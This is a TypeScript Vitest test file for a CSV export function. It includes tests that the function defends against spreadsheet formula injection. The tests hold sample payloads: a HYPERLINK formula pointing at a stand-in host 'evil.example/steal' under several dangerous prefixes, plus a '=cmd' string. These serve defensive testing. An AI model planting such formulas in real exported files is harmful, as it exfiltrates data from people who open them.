import { describe, it, expect } from "vitest";
import { toCsv } from "./csv";

// Undoes toCsv's own quoting for a single-cell CSV output, so tests can
// assert on the logical cell value regardless of whether it happened to
// need quote-wrapping (e.g. because it also contains a comma or a quote).
function unwrapSingleCell(csv: string): string {
  if (csv.startsWith('"') && csv.endsWith('"')) {
    return csv.slice(1, -1).replace(/""/g, '"');
  }
  return csv;
}

describe("toCsv", () => {
  it("joins plain cells with commas and rows with newlines", () => {
    expect(toCsv([["a", "b"], ["c", "d"]])).toBe("a,b\nc,d");
  });

  it("quotes and escapes cells containing a comma, quote, or newline", () => {
    expect(toCsv([['say "hi"']])).toBe('"say ""hi"""');
    expect(toCsv([["a,b"]])).toBe('"a,b"');
    expect(toCsv([["line1\nline2"]])).toBe('"line1\nline2"');
  });

  it("treats null/undefined as an empty cell", () => {
    expect(toCsv([[null as unknown as string, undefined as unknown as string]])).toBe(",");
  });

  it("converts numbers to plain digits", () => {
    expect(toCsv([[1, 2.5]])).toBe("1,2.5");
  });

  describe("formula injection defense", () => {
    // A building/staff/subcontractor name a user typed could start with one
    // of these characters — if exported as-is, Excel/Sheets/LibreOffice
    // would read the cell as a formula when the file is opened, which can
    // exfiltrate data (=HYPERLINK) or, on older Excel, run commands (DDE).
    const dangerousPrefixes = ["=", "+", "-", "@", "\t", "\r"];

    for (const prefix of dangerousPrefixes) {
      it(`neutralizes a cell starting with ${JSON.stringify(prefix)}`, () => {
        const evil = `${prefix}HYPERLINK("http://evil.example/steal","click")`;
        const cell = unwrapSingleCell(toCsv([[evil]]));
        // The original text is preserved right after the guard quote — this
        // defuses the formula without silently dropping the user's data.
        expect(cell).toBe(`'${evil}`);
      });
    }

    it("leaves an ordinary cell that merely contains one of these characters mid-string alone", () => {
      expect(toCsv([["cost=5"]])).toBe("cost=5");
      expect(toCsv([["well-known-building"]])).toBe("well-known-building");
    });

    it("still quotes a neutralized cell that also needs comma/quote escaping", () => {
      const evil = '=cmd,"boom"';
      const result = toCsv([[evil]]);
      expect(result).toBe(`"'${evil.replace(/"/g, '""')}"`);
    });
  });
});
